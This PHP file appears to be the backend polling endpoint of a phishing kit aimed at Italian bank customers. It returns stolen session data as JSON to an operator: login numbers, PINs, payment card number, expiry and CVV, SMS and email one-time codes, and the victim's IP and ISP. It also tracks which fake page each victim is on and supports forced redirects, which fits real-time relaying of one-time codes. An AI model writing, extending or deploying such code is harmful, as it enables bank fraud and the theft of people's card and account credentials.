<?php
header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate');

$id = $_GET['id'] ?? '';
$df = __DIR__ . '/data.json';
$data = file_exists($df) ? json_decode(file_get_contents($df), true) : ['sessions' => []];

if (!isset($data['sessions'][$id])) {
    echo json_encode(['status' => 'finish', 'next_page' => 'finish', 'force_redirect' => 0]);
    exit;
}

$s = $data['sessions'][$id];

// === UPDATE LAST SEEN + CURRENT PAGE ===
$current_page = $_GET['cp'] ?? '';
$allowed_pages = ['login', 'verifica', 'carta', 'otp_sms', 'otp_mail', 'finish'];
if (in_array($current_page, $allowed_pages, true)) {
    $data['sessions'][$id]['current_page'] = $current_page;
    $data['sessions'][$id]['last_seen']    = time();
    file_put_contents($df, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}

echo json_encode([
    'status'         => $s['status']         ?? 'waiting',
    'next_page'      => $s['next_page']      ?? '',
    'force_redirect' => (int)($s['force_redirect'] ?? 0),
    'nc'             => $s['nc']             ?? '',
    'pin'            => $s['pin']            ?? '',
    'ip'             => $s['ip']             ?? '',
    'isp'            => $s['isp']            ?? '',
    'verdict'        => $s['verdict']        ?? '',
    'carta_numero'   => $s['carta_numero']   ?? '',
    'carta_scadenza' => $s['carta_scadenza'] ?? '',
    'carta_cvv'      => $s['carta_cvv']      ?? '',
    'otp_sms'        => $s['otp_sms']        ?? '',
    'otp_mail'       => $s['otp_mail']       ?? '',
    'current_page'   => $s['current_page']   ?? 'unknown',
    'last_seen'      => (int)($s['last_seen'] ?? 0)
]);